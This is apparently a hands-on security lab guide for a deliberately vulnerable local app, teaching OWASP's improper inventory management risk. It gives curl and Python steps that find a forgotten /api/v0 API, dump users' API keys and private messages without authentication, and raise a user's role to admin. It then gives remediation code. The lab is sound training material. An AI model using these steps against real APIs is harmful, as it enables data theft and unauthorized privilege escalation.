# Lab 14: Improper Inventory Management — Shadow Legacy API

## Overview

| Field          | Details                                               |
|----------------|-------------------------------------------------------|
| **Objective**  | Discover and exploit an undocumented, unauthenticated legacy API version |
| **Difficulty** | ⭐ Easy                                              |
| **Time**       | 30 minutes                                            |
| **Category**   | Reconnaissance / Improper Inventory Management         |
| **OWASP**      | API9:2023 - Improper Inventory Management              |

---

## Prerequisites

- A running instance of **SocialHack API** at `http://localhost:5001`
- `curl` or Python 3 with the `requests` library
- Completion of Lab 02 (Information Disclosure) is recommended — this lab reuses the `/api/v1/debug` endpoint for discovery

---

## Background

**Improper Inventory Management** happens when an organization loses track of which API versions, environments, or endpoints are actually running in production. A very common real-world case: a new API version (`v1`) launches, but the old version (`v0`) is never formally decommissioned — it just keeps running, unmonitored, undocumented, and without any of the security controls added to the current version.

SocialHack API has exactly this problem: a `/api/v0/*` API predates the JWT-based auth system and was never removed. None of its routes require authentication at all, and it is not listed anywhere in the API's own documentation or root endpoint index.

---

## Tasks

### Task 1: Discover the Legacy API via the Debug Endpoint

**Steps:**
1. Query the debug endpoint, which lists every registered Flask route
2. Filter for anything that doesn't match the documented `/api/v1/*` pattern

**curl example:**
```bash
curl -s http://localhost:5001/api/v1/debug | python3 -c "
import sys, json
data = json.load(sys.stdin)
for route in data['registered_routes']:
    if '/api/v0' in route:
        print(route)
"
```

**Python example:**
```python
import requests

BASE = "http://localhost:5001"
r = requests.get(f"{BASE}/api/v1/debug")
routes = r.json()["registered_routes"]
legacy_routes = [r for r in routes if "/api/v0" in r]
print("Legacy routes found:")
for route in legacy_routes:
    print(f"  {route}")
```

**🚩 FLAG 1: List all discovered `/api/v0/*` routes**

<details>
<summary>💡 Hint 1</summary>
The debug endpoint at <code>/api/v1/debug</code> exposes <code>registered_routes</code> — it lists literally every Flask route, including the ones nobody meant to keep public.
</details>

---

### Task 2: Dump All Users Without Authentication

**Steps:**
1. Send a plain GET request to the legacy users endpoint — no `Authorization` header at all
2. Confirm it returns full user records including sensitive fields

**curl example:**
```bash
curl -s http://localhost:5001/api/v0/users | python3 -m json.tool
```

**Python example:**
```python
r = requests.get(f"{BASE}/api/v0/users")
print(f"Status: {r.status_code}")
users = r.json()["users"]
print(f"[VULN] Dumped {len(users)} full user records with ZERO authentication")
for u in users:
    print(f"  {u['username']} | api_key={u.get('api_key')} | notes={u.get('internal_notes')}")
```

**🚩 FLAG 2: What is admin's `api_key` value, retrieved with no auth token at all?**

<details>
<summary>💡 Hint 1</summary>
Compare this to the v1 <code>/api/v1/admin/users</code> endpoint from Lab 06 — that one at least required *some* valid JWT. This one requires nothing.
</details>

---

### Task 3: Dump the Entire Database in One Request

**Steps:**
1. Call the legacy "internal debugging" export endpoint

**Python example:**
```python
r = requests.get(f"{BASE}/api/v0/export-all")
data = r.json()
print(f"Users: {len(data['users'])}")
print(f"Posts: {len(data['posts'])}")
print(f"Private messages: {len(data['messages'])}")
```

**🚩 FLAG 3: Find a private message (from the export dump) that contains sensitive information**

<details>
<summary>💡 Hint 1</summary>
Look through the "messages" array — recall from the seed data that some direct messages contain things like temporary passwords or personal information.
</details>

---

### Task 4: Unauthenticated Privilege Escalation

**Steps:**
1. Use the legacy `PUT /api/v0/users/:id` endpoint (no token needed) to change your own account's role to `admin`

**Python example:**
```python
# No Authorization header required at all!
r = requests.put(f"{BASE}/api/v0/users/1", json={"role": "admin", "is_verified": True})
print(r.json())

# Verify: login normally and check the role in the returned user object
r = requests.post(f"{BASE}/api/v1/auth/login", json={"username": "alice", "password": "password123"})
print("Role after legacy API attack:", r.json()["user"]["role"])
```

**🚩 FLAG 4: Successfully escalate a user's role to admin with zero authentication**

<details>
<summary>💡 Hint 1</summary>
The legacy update endpoint applies the exact same unrestricted mass-assignment logic as the v1 API's <code>PUT /api/v1/users/:id</code>, but doesn't even require a valid token first.
</details>

---

## Flags to Find

| Flag   | Description                                              | Hint                                       |
|--------|------------------------------------------------------------|----------------------------------------------|
| FLAG 1 | List of discovered `/api/v0/*` routes                      | Check `/api/v1/debug` registered_routes      |
| FLAG 2 | Admin's `api_key`, retrieved with no auth                  | `GET /api/v0/users`                          |
| FLAG 3 | Sensitive content found in a dumped private message        | `GET /api/v0/export-all`                     |
| FLAG 4 | Escalate a user to admin role with zero authentication      | `PUT /api/v0/users/:id`                      |

---

## Remediation

### 1. Actually Decommission Deprecated Versions
```python
# Return 410 Gone instead of silently keeping the old version alive
@legacy_bp.before_request
def block_deprecated():
    return jsonify({"error": "This API version was retired on 2024-01-01"}), 410
```

### 2. Maintain a Living API Inventory
- Every route, version, and environment should be registered in a central inventory with an owner and a decommission date.
- CI/CD should fail the build if an undocumented route reaches production (diff `flask routes` output against the published OpenAPI spec).

### 3. Apply Security Controls at the Gateway Level, Not Per-Version
- Auth, rate limiting, and logging should be enforced by infrastructure (API gateway / reverse proxy) so that a forgotten code path can't silently bypass them.

### 4. Restrict Internal/Debug Endpoints to Internal Networks
```python
@app.before_request
def block_debug_in_prod():
    if request.path == "/api/v1/debug" and os.environ.get("FLASK_ENV") == "production":
        return jsonify({"error": "Not found"}), 404
```

---

## References

- [OWASP API Security Top 10 - API9:2023](https://owasp.org/API-Security/editions/2023/en/0xa9-improper-inventory-management/)
- [CWE-1059: Insufficient Technical Documentation](https://cwe.mitre.org/data/definitions/1059.html)
